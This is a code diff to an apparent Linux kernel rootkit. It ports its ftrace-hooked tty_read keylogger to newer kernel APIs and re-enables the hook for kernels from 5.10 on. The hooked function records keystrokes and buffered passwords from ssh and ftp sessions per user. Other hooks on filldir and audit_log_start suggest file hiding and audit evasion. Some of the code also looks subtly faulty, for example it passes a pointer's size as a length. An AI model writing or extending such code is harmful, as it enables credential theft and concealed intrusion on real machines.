@@ -786,73 +786,74 @@ void _keylog_cleanup(void) {
         prerr("Error removing %s\n", tty);
 }
 
+#if LINUX_VERSION_CODE < KERNEL_VERSION(5,12,0)
 static ssize_t  (*real_tty_read)(struct file *, char __user *, size_t, loff_t *);
 static ssize_t __attribute__((unused))
-    m_tty_read(struct file *file, char __user *buf, size_t count, loff_t *ppos) {
-
-    enum { APP_SSH = 1, APP_FTP };
-    struct fs_file_node *fs = NULL;
-    char byte;
-    int flags = R_NONE;
-    int app_flag = 0;
-    ssize_t rv;
+    m_tty_read(struct file *file, char __user *buf, size_t count, loff_t *ppos)
+#else
+static ssize_t  (*real_tty_read)(struct kiocb *iocb, struct iov_iter *to);
+static ssize_t m_tty_read(struct kiocb *iocb, struct iov_iter *to)
+#endif
+{
     char *ttybuf = NULL;
-    uid_t uid;
+    struct fs_file_node *fs = NULL;
 
-    //struct tty_struct *tty =
-    //  ((struct tty_file_private *)file->private_data)->tty;
-
-    rv = real_tty_read(file, buf, count, ppos);
+#if LINUX_VERSION_CODE < KERNEL_VERSION(5,12,0)
+    ssize_t rv = real_tty_read(file, buf, count, ppos);
+#else
+    ssize_t rv = real_tty_read(iocb, to);
+#endif
     if (rv <= 0)
         goto out;
 
-    fs = fs_get_file_node(current);
-    if (!fs) goto out;
-
-    if (!strncmp(fs->filename, "ssh", 3))
-        app_flag |= APP_SSH;
-    else if (!strncmp(fs->filename, "netkit", 6))
-        app_flag |= APP_FTP;
-
-    if (!app_flag)
-        goto out;
-
     ttybuf = kzalloc(rv+2, GFP_KERNEL);
-    if (!ttybuf)
-        goto out;
+    if (ttybuf) {
+        char byte;
+        uid_t uid;
+        enum { APP_SSH = 1, APP_FTP };
+        int app_flag = 0, flags = R_NONE;
 
-    if (copy_from_user(ttybuf, buf, rv))
-        goto out;
+#if LINUX_VERSION_CODE < KERNEL_VERSION(5,12,0)
+        if (copy_from_user(ttybuf, buf, rv))
+            goto out;
+#else
+        if (copy_from_user(ttybuf, to->iov->iov_base, rv))
+            goto out;
+#endif
 
-    byte = ttybuf[0];
-    uid = current->cred->uid.val;
+        fs = fs_get_file_node(current);
+        if (!fs) goto out;
 
-    flags |= (byte >= 32 && byte < 127) ? R_RANGE : flags;
-    flags |= (byte == '\r') ? R_RETURN : flags;
-    flags |= (byte == '\n') ? R_NEWLINE : flags;
+        if (!strncmp(fs->filename, "ssh", 3))
+            app_flag |= APP_SSH;
+        else if (!strncmp(fs->filename, "netkit", 6))
+            app_flag |= APP_FTP;
 
-    /**
-     * this is hacky but ssh session data
-     * comes bit a bit, while ftp same, however
-     * it can also come in as a batch, for example, when a password
-     * is entered it is buffered internally and sent as a whole at once
-     */
-    if ((app_flag & APP_FTP) && rv > 1) {
-        ttybuf[strcspn(ttybuf, "\r")] = '\0';
-        _tty_write_log(uid, 0, ttybuf,
-                sizeof(ttybuf));
+        byte = ttybuf[0];
+        uid = current->cred->uid.val;
 
-    } else if (app_flag & APP_SSH &&
-            (rv == 1 || flags & R_RETURN || flags & R_NEWLINE)) {
-        _key_update(uid, byte, flags);
+        flags |= (byte >= 32 && byte < 127) ? R_RANGE : flags;
+        flags |= (byte == '\r') ? R_RETURN : flags;
+        flags |= (byte == '\n') ? R_NEWLINE : flags;
+
+        /**
+         * this is hacky but ssh session data
+         * comes bit a bit, while ftp same, however
+         * it can also come in as a batch, for example, when a password
+         * is entered it is buffered internally and sent as a whole at once
+         */
+        if ((app_flag & APP_FTP) && rv > 1) {
+            ttybuf[strcspn(ttybuf, "\r")] = '\0';
+            _tty_write_log(uid, 0, ttybuf,
+                    sizeof(ttybuf));
+
+        } else if (app_flag & APP_SSH &&
+                (rv == 1 || flags & R_RETURN || flags & R_NEWLINE)) {
+            _key_update(uid, byte, flags);
+        }
     }
-
 out:
-    if (ttybuf)
-        kfree(ttybuf);
-
-    if (fs)
-        kfree(fs);
+    kv_mem_free(&ttybuf, &fs);
     return rv;
 }
 
@@ -1006,9 +1007,7 @@ static struct ftrace_hook ft_hooks[] = {
     {"audit_log_start", m_audit_log_start, &real_audit_log_start},
     {"filldir", m_filldir, &real_filldir},
     {"filldir64", m_filldir64, &real_filldir64},
-#if LINUX_VERSION_CODE < KERNEL_VERSION(5,10,0) /** copy_from_user/access_ok Fails */
     {"tty_read", m_tty_read, &real_tty_read},
-#endif
     {NULL, NULL, NULL},
 };
 
